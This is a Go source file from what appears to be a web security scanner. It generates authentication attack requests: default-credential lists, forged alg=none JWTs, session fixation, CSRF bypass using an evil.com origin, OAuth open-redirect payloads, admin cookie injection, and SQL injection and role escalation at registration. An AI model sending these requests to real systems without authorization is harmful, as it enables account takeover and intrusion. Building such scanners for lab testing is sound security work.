package attacks

import (
	"encoding/base64"
	"fmt"
	"net/url"

	"github.com/cornerglitch/internal/scanner"
)

// AuthModule generates attack requests for authentication and authorization
// testing: default credentials, JWT manipulation, session fixation, CSRF bypass,
// OAuth flow manipulation, and cookie manipulation.
type AuthModule struct{}

func (m *AuthModule) Name() string     { return "auth" }
func (m *AuthModule) Category() string { return "authentication" }

func (m *AuthModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.defaultCredentials()...)
	reqs = append(reqs, m.tokenManipulation()...)
	reqs = append(reqs, m.sessionFixation()...)
	reqs = append(reqs, m.csrfBypass()...)
	reqs = append(reqs, m.oauthManipulation()...)
	reqs = append(reqs, m.cookieManipulation()...)
	reqs = append(reqs, m.bruteForcePatterns()...)
	reqs = append(reqs, m.registrationAbuse()...)

	return reqs
}

// ---------------------------------------------------------------------------
// Default Credentials
// ---------------------------------------------------------------------------

func (m *AuthModule) defaultCredentials() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	creds := []struct {
		user string
		pass string
	}{
		{"admin", "admin"},
		{"admin", "password"},
		{"admin", "123456"},
		{"admin", "admin123"},
		{"admin", ""},
		{"root", "root"},
		{"root", "toor"},
		{"root", "password"},
		{"test", "test"},
		{"user", "user"},
		{"guest", "guest"},
		{"demo", "demo"},
		{"administrator", "administrator"},
		{"admin", "Password1"},
		{"admin", "admin@123"},
		{"sa", "sa"},
		{"sa", ""},
		{"postgres", "postgres"},
		{"mysql", "mysql"},
		{"oracle", "oracle"},
		{"tomcat", "tomcat"},
		{"manager", "manager"},
		{"admin", "changeme"},
		{"admin", "welcome"},
		{"admin", "letmein"},
	}

	// Form-based login endpoints
	loginPaths := []string{"/login", "/vuln/a07/login", "/admin", "/api/auth", "/vuln/api-sec/api2/login"}

	for _, path := range loginPaths {
		for _, c := range creds {
			// URL-encoded form POST
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        fmt.Sprintf("username=%s&password=%s", url.QueryEscape(c.user), url.QueryEscape(c.pass)),
				BodyType:    "application/x-www-form-urlencoded",
				Category:    "Auth",
				SubCategory: "default-credentials",
				Description: fmt.Sprintf("Default creds on %s: %s/%s", path, c.user, c.pass),
			})
		}
	}

	// JSON-based login endpoints
	jsonPaths := []string{"/api/auth", "/vuln/api-sec/api2/login", "/api/v1/login"}
	for _, path := range jsonPaths {
		for _, c := range creds[:10] { // Top 10 most common
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        fmt.Sprintf(`{"username":"%s","password":"%s"}`, c.user, c.pass),
				BodyType:    "application/json",
				Category:    "Auth",
				SubCategory: "default-credentials",
				Description: fmt.Sprintf("Default creds (JSON) on %s: %s/%s", path, c.user, c.pass),
			})
		}
	}

	// HTTP Basic Auth
	basicAuthPaths := []string{"/admin", "/api/v1/users", "/", "/login"}
	for _, path := range basicAuthPaths {
		for _, c := range creds[:8] {
			encoded := base64.StdEncoding.EncodeToString([]byte(c.user + ":" + c.pass))
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        path,
				Headers:     map[string]string{"Authorization": "Basic " + encoded},
				Category:    "Auth",
				SubCategory: "basic-auth-brute",
				Description: fmt.Sprintf("Basic Auth on %s: %s/%s", path, c.user, c.pass),
			})
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Token Manipulation (JWT)
// ---------------------------------------------------------------------------

func (m *AuthModule) tokenManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// JWT with "alg": "none"
	// Header: {"alg":"none","typ":"JWT"} = eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
	// Payload: {"sub":"admin","role":"admin","iat":1700000000} = eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0
	noneJWT := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0."

	// JWT with "alg": "HS256" and common weak secrets
	// These are pre-constructed tokens for testing; the server should validate them
	weakJWTs := []struct {
		token string
		desc  string
	}{
		{noneJWT, "JWT with alg=none (no signature)"},
		{"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.invalid-signature",
			"JWT with invalid signature"},
		{"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MX0.tampered",
			"JWT with tampered payload (iat=1)"},
		{"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MX0.expired",
			"JWT with expired timestamp (exp=1)"},
		{"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.alg-confusion",
			"JWT with RS256 header (algorithm confusion attack)"},
	}

	paths := []string{"/admin", "/api/v1/users", "/vuln/jwt/verify", "/vuln/a08/token"}

	for _, path := range paths {
		for _, j := range weakJWTs {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        path,
				Headers:     map[string]string{"Authorization": "Bearer " + j.token},
				Category:    "Auth",
				SubCategory: "jwt-manipulation",
				Description: fmt.Sprintf("JWT attack on %s: %s", path, j.desc),
			})
		}
	}

	// Request JWT with none algorithm
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/vuln/a08/token?alg=none",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "jwt-manipulation",
		Description: "Request JWT generation with alg=none",
	})
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/vuln/jwt/token?alg=none",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "jwt-manipulation",
		Description: "Request JWT generation with alg=none (alt endpoint)",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Session Fixation
// ---------------------------------------------------------------------------

func (m *AuthModule) sessionFixation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/login", "/vuln/a07/login", "/admin"}

	for _, path := range paths {
		// Set a known session ID before authentication
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "session=attacker-controlled-session-id"},
			Category:    "Auth",
			SubCategory: "session-fixation",
			Description: fmt.Sprintf("Session fixation: pre-set session cookie on %s", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path + "?sessionid=fixed-session-12345",
			Headers:     map[string]string{},
			Category:    "Auth",
			SubCategory: "session-fixation",
			Description: fmt.Sprintf("Session fixation via URL param on %s", path),
		})

		// POST with pre-set session
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{"Cookie": "PHPSESSID=fixed-session-abc123"},
			Body:        "username=admin&password=admin",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "session-fixation",
			Description: fmt.Sprintf("Session fixation: login with pre-set PHPSESSID on %s", path),
		})

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{"Cookie": "JSESSIONID=fixed-session-xyz789"},
			Body:        "username=admin&password=admin",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "session-fixation",
			Description: fmt.Sprintf("Session fixation: login with pre-set JSESSIONID on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// CSRF Token Bypass
// ---------------------------------------------------------------------------

func (m *AuthModule) csrfBypass() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/admin", "/api/v1/users", "/login", "/vuln/a07/login"}

	for _, path := range paths {
		// No CSRF token at all
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{},
			Body:        "action=delete&id=1",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "csrf-bypass",
			Description: fmt.Sprintf("CSRF bypass: no token on %s", path),
		})

		// Empty CSRF token
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{"X-CSRF-Token": ""},
			Body:        "action=delete&id=1&csrf_token=",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "csrf-bypass",
			Description: fmt.Sprintf("CSRF bypass: empty token on %s", path),
		})

		// Fake CSRF token
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{"X-CSRF-Token": "fake-token-value"},
			Body:        "action=delete&id=1&csrf_token=fake-token-value",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "csrf-bypass",
			Description: fmt.Sprintf("CSRF bypass: fake token on %s", path),
		})

		// Cross-origin with JSON content type (bypasses same-origin for forms)
		reqs = append(reqs, scanner.AttackRequest{
			Method: "POST",
			Path:   path,
			Headers: map[string]string{
				"Origin":       "http://evil.com",
				"Content-Type": "text/plain",
			},
			Body:     `{"action":"delete","id":1}`,
			BodyType: "text/plain",
			Category: "Auth", SubCategory: "csrf-bypass",
			Description: fmt.Sprintf("CSRF bypass: cross-origin text/plain on %s", path),
		})

		// Referer manipulation
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{"Referer": "http://evil.com/csrf-page"},
			Body:        "action=delete&id=1",
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "csrf-bypass",
			Description: fmt.Sprintf("CSRF bypass: spoofed Referer on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// OAuth Flow Manipulation
// ---------------------------------------------------------------------------

func (m *AuthModule) oauthManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Open redirect in OAuth callback
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/oauth/authorize?response_type=code&client_id=test&redirect_uri=http://evil.com/callback",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "oauth-redirect",
		Description: "OAuth: open redirect via redirect_uri to attacker domain",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/oauth/authorize?response_type=code&client_id=test&redirect_uri=http://evil.com%40legitimate.com/callback",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "oauth-redirect",
		Description: "OAuth: redirect_uri with @ symbol bypass",
	})

	// Token exchange with forged code
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/oauth/token",
		Headers:     map[string]string{},
		Body:        "grant_type=authorization_code&code=forged-code&redirect_uri=http://localhost/callback&client_id=test&client_secret=test",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Auth",
		SubCategory: "oauth-token-forge",
		Description: "OAuth: token exchange with forged authorization code",
	})

	// Token exchange with client_credentials
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/oauth/token",
		Headers:     map[string]string{},
		Body:        "grant_type=client_credentials&client_id=admin&client_secret=admin",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Auth",
		SubCategory: "oauth-client-creds",
		Description: "OAuth: client_credentials with default admin/admin",
	})

	// Token exchange with password grant
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "POST",
		Path:        "/oauth/token",
		Headers:     map[string]string{},
		Body:        "grant_type=password&username=admin&password=admin&client_id=test",
		BodyType:    "application/x-www-form-urlencoded",
		Category:    "Auth",
		SubCategory: "oauth-password-grant",
		Description: "OAuth: password grant with default credentials",
	})

	// OIDC discovery
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/.well-known/openid-configuration",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "oauth-discovery",
		Description: "OAuth/OIDC: OpenID Connect discovery endpoint",
	})

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/.well-known/oauth-authorization-server",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "oauth-discovery",
		Description: "OAuth: authorization server metadata",
	})

	// Scope escalation
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/oauth/authorize?response_type=code&client_id=test&scope=admin+read+write+delete&redirect_uri=http://localhost/callback",
		Headers:     map[string]string{},
		Category:    "Auth",
		SubCategory: "oauth-scope-escalation",
		Description: "OAuth: scope escalation with admin permissions",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Cookie Manipulation
// ---------------------------------------------------------------------------

func (m *AuthModule) cookieManipulation() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/admin", "/api/v1/users", "/vuln/a07/dashboard"}

	for _, path := range paths {
		// Remove auth cookie
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": ""},
			Category:    "Auth",
			SubCategory: "cookie-removal",
			Description: fmt.Sprintf("Cookie manipulation: empty cookie header on %s", path),
		})

		// Admin cookie injection
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "role=admin; is_admin=true; user=admin"},
			Category:    "Auth",
			SubCategory: "cookie-injection",
			Description: fmt.Sprintf("Cookie manipulation: inject admin role on %s", path),
		})

		// Boolean flag manipulation
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "authenticated=true; verified=true; premium=true"},
			Category:    "Auth",
			SubCategory: "cookie-injection",
			Description: fmt.Sprintf("Cookie manipulation: boolean flag bypass on %s", path),
		})

		// Session cookie with predictable value
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "session=1; token=1"},
			Category:    "Auth",
			SubCategory: "cookie-prediction",
			Description: fmt.Sprintf("Cookie manipulation: predictable session value on %s", path),
		})

		// User ID in cookie
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "user_id=1; uid=0"},
			Category:    "Auth",
			SubCategory: "cookie-idor",
			Description: fmt.Sprintf("Cookie manipulation: user ID override on %s", path),
		})

		// JWT in cookie
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."},
			Category:    "Auth",
			SubCategory: "cookie-jwt",
			Description: fmt.Sprintf("Cookie manipulation: JWT with alg=none in cookie on %s", path),
		})

		// Encoded cookie values
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     map[string]string{"Cookie": "data=" + base64.StdEncoding.EncodeToString([]byte(`{"role":"admin","id":1}`))},
			Category:    "Auth",
			SubCategory: "cookie-encoded",
			Description: fmt.Sprintf("Cookie manipulation: base64-encoded admin payload on %s", path),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Brute Force Patterns
// ---------------------------------------------------------------------------

func (m *AuthModule) bruteForcePatterns() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Username enumeration via different response
	usernames := []string{"admin", "root", "test", "user", "guest", "info", "support", "webmaster"}
	for _, u := range usernames {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/login",
			Headers:     map[string]string{},
			Body:        fmt.Sprintf("username=%s&password=wrong-password-12345", u),
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "username-enumeration",
			Description: fmt.Sprintf("Username enumeration: test if '%s' exists", u),
		})
	}

	// Account lockout testing
	for i := 0; i < 5; i++ {
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        "/login",
			Headers:     map[string]string{},
			Body:        fmt.Sprintf("username=admin&password=wrong-%d", i),
			BodyType:    "application/x-www-form-urlencoded",
			Category:    "Auth",
			SubCategory: "lockout-test",
			Description: fmt.Sprintf("Account lockout test: attempt %d/5 for admin", i+1),
		})
	}

	// Password reset abuse
	resetPaths := []string{"/api/auth/reset", "/vuln/a04/reset", "/vuln/api-sec/api2/reset-password"}
	emails := []string{"admin@example.com", "test@test.com", "root@localhost"}
	for _, path := range resetPaths {
		for _, email := range emails {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "POST",
				Path:        path,
				Headers:     map[string]string{},
				Body:        fmt.Sprintf("email=%s", url.QueryEscape(email)),
				BodyType:    "application/x-www-form-urlencoded",
				Category:    "Auth",
				SubCategory: "password-reset-abuse",
				Description: fmt.Sprintf("Password reset for %s on %s", email, path),
			})
		}
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Registration Abuse
// ---------------------------------------------------------------------------

func (m *AuthModule) registrationAbuse() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	regPaths := []string{"/register", "/signup", "/api/auth/register", "/api/v1/register"}

	for _, path := range regPaths {
		// Register as admin
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{},
			Body:        `{"username":"attacker","password":"P@ssw0rd","role":"admin","is_admin":true}`,
			BodyType:    "application/json",
			Category:    "Auth",
			SubCategory: "registration-abuse",
			Description: fmt.Sprintf("Registration with role=admin on %s", path),
		})

		// Register with duplicate username
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{},
			Body:        `{"username":"admin","password":"attacker123","email":"attacker@evil.com"}`,
			BodyType:    "application/json",
			Category:    "Auth",
			SubCategory: "registration-abuse",
			Description: fmt.Sprintf("Registration with existing username 'admin' on %s", path),
		})

		// Register with SQL injection in username
		reqs = append(reqs, scanner.AttackRequest{
			Method:      "POST",
			Path:        path,
			Headers:     map[string]string{},
			Body:        `{"username":"admin'--","password":"test","email":"test@test.com"}`,
			BodyType:    "application/json",
			Category:    "Auth",
			SubCategory: "registration-abuse",
			Description: fmt.Sprintf("Registration with SQLi in username on %s", path),
		})
	}

	return reqs
}
